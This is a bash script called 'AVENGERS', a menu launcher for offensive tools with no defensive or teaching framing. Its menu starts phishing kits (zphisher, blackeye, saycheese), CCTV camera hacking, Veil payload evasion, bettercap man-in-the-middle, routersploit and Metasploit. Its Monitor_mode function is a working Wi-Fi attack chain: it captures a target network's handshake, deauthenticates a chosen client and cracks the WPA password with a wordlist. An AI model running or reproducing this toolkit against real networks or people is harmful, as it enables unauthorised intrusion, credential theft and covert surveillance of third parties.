#!/bin/bash

avengers() {
printf " \e[36;1m     _  __     __ _____   _   _    ____   _____   ____    ____  \e[0m\n"
printf " \e[36;1m    / \ \ \   / /| ____| | \ | |  / ___| | ____| |  _ \  / ___| \e[0m\n"
printf " \e[36;1m   / _ \ \ \ / / |  _|   |  \| | | |  _  |  _|   | |_) | \___ \ \e[0m\n"
printf " \e[36;1m  / ___ \ \ V /  | |___  | |\  | | |_| | | |___  |  _ <   ___) |\e[0m\n"
printf " \e[36;1m /_/   \_\ \_/   |_____| |_| \_|  \____| |_____| |_| \_\ |____/ \e[0m\n"
printf "  			       \n"
printf " \e[31;1m #   L   O   V   E     Y   O   U     3   0   0  0   .  .  .  . . \e[0m\n"
#echo -e "\e[1;34;5m  # D E V E L O P E R  :  A L B I N  J O S E P H  C . R  \e[0m\e[1;5m[ UCEH ]\e[0m"
printf " \e[1;92;5m[\e[1;37;5m+\e[92m]\e[1;34;5m D E V E L O P E R :  A L B I N  J O S E P H  C . R  \e[0m\e[1;5m[ UCEH ]\e[0m"
printf "  			       \n"
}

logo() {
printf " \e[31;1m ───────────────────────────────\e[0m\e[33;1m▐█████\e[0m\e[31;1m──────────────────────────\e[0m\n"
printf " \e[31;1m ────────────────────────\e[0m\e[33;1m▄▄████████████▄\e[0m\e[31;1m────────────────────────\e[0m\n"
printf " \e[31;1m ─────────────────────\e[0m\e[33;1m▄██▀▀────▐███▐████▄\e[0m\e[31;1m───────────────────────\e[0m\n"
printf " \e[31;1m ───────────────────\e[0m\e[33;1m▄██▀───────███▌▐██─▀██▄\e[0m\e[31;1m─────────────────────\e[0m\n"
printf " \e[31;1m ──────────────────\e[0m\e[33;1m▐██────────▐███─▐██───██▌\e[0m\e[31;1m────────────────────\e[0m\n"
printf " \e[31;1m ──────────────────\e[0m\e[33;1m██▌────────███▌─▐██───▐██\e[0m\e[31;1m────────────────────\e[0m\n"
printf " \e[31;1m ─────────────────\e[0m\e[33;1m▐██────────▐███──▐██────██▌\e[0m\e[31;1m───────────────────\e[0m\n"
printf " \e[31;1m ─────────────────\e[0m\e[33;1m██▌────────███▌──▐██────▐██\e[0m\e[31;1m───────────────────\e[0m\n"
printf " \e[31;1m ─────────────────\e[0m\e[33;1m██▌───────▐███───▐██────▐██\e[0m\e[31;1m───────────────────\e[0m\n"
printf " \e[31;1m ─────────────────\e[0m\e[33;1m██▌───────███▌──▄─▀█────▐██\e[0m\e[31;1m───────────────────\e[0m\n"
printf " \e[31;1m ─────────────────\e[0m\e[33;1m██▌──────▐████████▄─────▐██\e[0m\e[31;1m───────────────────\e[0m\n"
printf " \e[31;1m ─────────────────\e[0m\e[33;1m██▌──────█████████▀─────▐██\e[0m\e[31;1m───────────────────\e[0m\n"
printf " \e[31;1m ─────────────────\e[0m\e[33;1m▐██─────▐██▌────▀─▄█────██▌\e[0m\e[31;1m───────────────────\e[0m\n"
printf " \e[31;1m ──────────────────\e[0m\e[33;1m██▌────███─────▄███───▐██\e[0m\e[31;1m────────────────────\e[0m\n"
printf " \e[31;1m ──────────────────\e[0m\e[33;1m▐██▄──▐██▌───────────▄██▌\e[0m\e[31;1m────────────────────\e[0m\n"
printf " \e[31;1m ───────────────────\e[0m\e[33;1m▀███─███─────────▄▄███▀\e[0m\e[31;1m─────────────────────\e[0m\n"
printf " \e[31;1m ───────────────────────\e[0m\e[33;1m▐██▌─▀█████████▀▀\e[0m\e[31;1m───────────────────────\e[0m\n"
printf " \e[31;1m ───────────────────────\e[0m\e[33;1m███\e[0m\e[31;1m─────────────────────────────────────\e[0m\n"
}

fun() {
logo
avengers
menu
}

ring() {
#cd /root/Downloads
cd /usr/bin
play aring.mp3 &> /dev/null
}

Monitor_mode() {
airmon-ng check kill
sleep 2
airmon-ng start wlan0 
gnome-terminal -e "airodump-ng wlan0mon"
echo ""
echo ""
#bash /root/Scripts/wpa/wpa_clear.sh &> /dev/null #bash script to clear previous written files of wpa-01.cap, wpa-01.csv etc..
wpa_clear &> /dev/null #bash script to clear previous written files of wpa-01.cap, wpa-01.csv etc..

read -p "Do you want to continue with Advanced Monitoring(y/n)?: " ch1
if [ $ch1 == y ]
	then
	
	read -p "Enter the BSSID of AP: " bssid 
	read -p "Enter the channel: " ch
	gnome-terminal -e "airodump-ng --bssid $bssid --channel $ch --write /root/Scripts/wpa/wpa wlan0mon"
fi
echo ""

read -p "Do you want to perfrom Deauthentication Attack(y/n)?: " ch2
if [ $ch2 == y ]
	then
	read -p "Enter the MAC-Address of the client to Deauthenticate: " mac
	read -p "Enter the number of Deauthentication packets: " nodeauth
	aireplay-ng --deauth $nodeauth -a $bssid -c $mac wlan0mon
	
fi
echo ""

  read -p "Do you want to Crack WiFi Password(y/n)?: " ch3
if [ $ch3 == y ]
	then
	#aircrack-ng -w /usr/share/wordlists/fasttrack.txt /root/Scripts/fluxion/HUAWEI-F0:3F:95:92:2E:18.cap
	aircrack-ng -w /usr/share/wordlists/fasttrack.txt /root/Scripts/wpa/wpa-01.cap
fi

airmon-ng stop wlan0mon
service network-manager start
}

Show_devices()
{
bettercap -caplet /usr/share/bettercap/caplets/Netshow.cap
}

menu() {
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Tor          \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Sysinfo      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m Bettercap\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m CCTV         \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;93m Lscript      \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;93m Saycheese\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Veil         \e[0m\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;93m Pentbox      \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;93m WiFi Hack\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m MITM         \e[0m\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;93m Zphisher     \e[0m\e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;93m Metasploit\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Nmap         \e[0m\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;93m Blackeye     \e[0m\e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;93m WiFiPumpkin\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Proxy        \e[0m\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;93m WMON ON!     \e[0m\e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;93m Show Devices\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok        \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;93m WMON OFF     \e[0m\e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;93m Routersploit\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Ghost        \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;93m Credover     \e[0m\e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;93m Server Start\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m WiFite       \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Firewall     \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m Server Stop!\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Fluxion      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Backlight    \e[0m\e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;93m E N D G A M E\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
/usr/bin/tor
elif [[ $option == 2 || $option == 02 ]]; then
cd /root/Scripts/Cam-Hackers
python3 cam-hackers.py
elif [[ $option == 3 || $option == 03 ]]; then
cd /root/Scripts/Veil
./Veil.py
elif [[ $option == 4 || $option == 04 ]]; then
bettercap -caplet /usr/share/bettercap/caplets/albin_mitm.cap
elif [[ $option == 5 || $option == 05 ]]; then
/usr/bin/nmape.sh
elif [[ $option == 6 || $option == 06 ]]; then
/usr/bin/pro
elif [[ $option == 7 || $option == 07 ]]; then
read -p "Enter The Port Number : " port
ngrok http $port
elif [[ $option == 8 || $option == 08 ]]; then
ghost
elif [[ $option == 9 || $option == 09 ]]; then
wifite
elif [[ $option == 10 ]]; then
cd /root/Scripts/fluxion
./fluxion.sh
elif [[ $option == 11 ]]; then
screenfetch
elif [[ $option == 12 ]]; then
l
elif [[ $option == 13 ]]; then
cd /root/Scripts/pentbox/pentbox-1.8
./pentbox.rb
elif [[ $option == 14 ]]; then
cd /root/Scripts/zphisher
./zphisher.sh
elif [[ $option == 15 ]]; then
cd /root/Scripts/blackeye
./blackeye.sh
elif [[ $option == 16 ]]; then
airmon-ng check kill
sleep 2
airmon-ng start wlan0 
elif [[ $option == 17 ]]; then
/usr/bin/dm
elif [[ $option == 18 ]]; then
/usr/bin/Credover
elif [[ $option == 19 ]]; then
gufw
elif [[ $option == 20 ]]; then
cd /sys/class/backlight/radeon_bl0/
nano brightness
elif [[ $option == 21 ]]; then
bettercap
elif [[ $option == 22 ]]; then
cd /root/Scripts/saycheese
./saycheese.sh
elif [[ $option == 23 ]]; then
Monitor_mode
elif [[ $option == 24 ]]; then
msfconsole
elif [[ $option == 25 ]]; then
wifipumpkin3
elif [[ $option == 26 ]]; then
Show_devices
elif [[ $option == 27 ]]; then
cd /root/Scripts/routersploit/
python3 rsf.py
elif [[ $option == 28 ]]; then
service apache2 start
elif [[ $option == 29 ]]; then
service apache2 stop
elif [[ $option == 30 ]]; then
exit 1
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1

fi
}

ring&fun
echo -e "\e[1;31;5m T h a n k   Y o u   F o r   U s i n g  A V E N G E R S   S c r i p t\e[0m"
ipflush > /dev/null


